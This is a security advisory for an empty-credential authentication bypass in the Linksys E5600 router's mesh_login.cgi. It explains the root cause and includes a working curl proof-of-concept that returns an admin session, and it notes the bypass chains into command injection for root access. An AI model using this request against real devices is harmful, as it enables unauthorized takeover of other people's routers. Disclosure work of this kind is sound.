# CVE-TBD: Linksys E5600 mesh_login.cgi Empty-Credential Authentication Bypass

## Affected Product

- Vendor: Linksys
- Product: E5600
- Firmware: v1.1.0.26
- Component: `/www/cgi-bin/mesh_login.cgi` (MIPS32 ELF binary, mesh/web login handler)

## Summary

The mesh/web login endpoint `/cgi-bin/mesh_login.cgi` contains an
authentication logic flaw: when the account lookup finds **no matching
account**, the expected-credential output buffers remain empty (zeroed),
and the caller proceeds to compare the **attacker-supplied** username and
password against those empty values. An unauthenticated attacker can
therefore log in by sending `username = SHA256hex("")` (a public constant)
and an empty password, receiving a fully privileged admin session —
**regardless of the real administrator password configured on the device**.

## Vulnerability Type / CWE

- CWE-287: Improper Authentication (incorrect comparison fallback; see also CWE-697)

## Root Cause

Decompiled control flow (function at 0x0040209c in mesh_login.cgi):

1. `lookup(client_username, client_password, out_real_user, 0x82,
   out_real_pass, 0x82, &level)` iterates the account database. A match
   requires `client_username == SHA256hex(stored_username)` AND
   `client_password == stored_password`.
2. **On no match, the function returns with `out_real_user`/`out_real_pass`
   still zeroed** (they were memset at entry) — no failure is propagated.
3. The caller then verifies:
   - `strcmp(global_source, "web") == 0`
   - `strcmp(global_client_password, out_real_pass /* "" */) == 0`
   - `strcmp(global_client_username, SHA256hex(out_real_user) /* SHA256("") */) == 0`

   Both comparisons are attacker-controlled global variables vs. constants
   derived from empty strings.
4. On "success" the handler writes `/tmp/httpd_session` (status=1, level=2),
   signals lighttpd, and issues an `HSESSIONID` cookie.

Note: any real account's username cannot hash to `SHA256("")`, so the
lookup always misses when the attacker sends this value — the bypass works
on fully configured devices.

## Proof of Concept (non-destructive)

```bash
curl -i -X POST http://<ROUTER_IP>/cgi-bin/mesh_login.cgi \
  -H 'Content-Type: application/json' \
  -d '{"action":"login","source":"web","username":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","password":"","token":"","cn":""}'
```

(`e3b0c442...855` is the SHA-256 hex of the empty string.)

Observed result:

```
HTTP/1.1 200 OK
Set-Cookie: HSESSIONID=172335611791626109

{"result":"success","code":"0","msg":{"AccessLevel":"0"},"firstlogin":"1"}
```

Device-side `/tmp/httpd_session` contains `status=1`, `level=2`.

**Control test** (proves the bypass uses the empty-fallback path, not an
always-success bug): sending `username = SHA256hex("admin")` with
`password = "wrongpass"` returns `{"result":"fail","code":"401"}` and no
session file is created.

## Impact

- Second, independent pre-authentication admin session issuance point.
- Chains into the authenticated Lua API command injections (e.g.
  CVE-2024-33789, CVE-2025-29228, CVE-2025-29230), yielding
  unauthenticated remote root command execution.

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Discovery

- Date: 2026-10-10
- Method: static reverse engineering (Ghidra) + dynamic verification on rehosted firmware
- Researcher: Zimo-666

## Timeline

- 2026-10-10: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
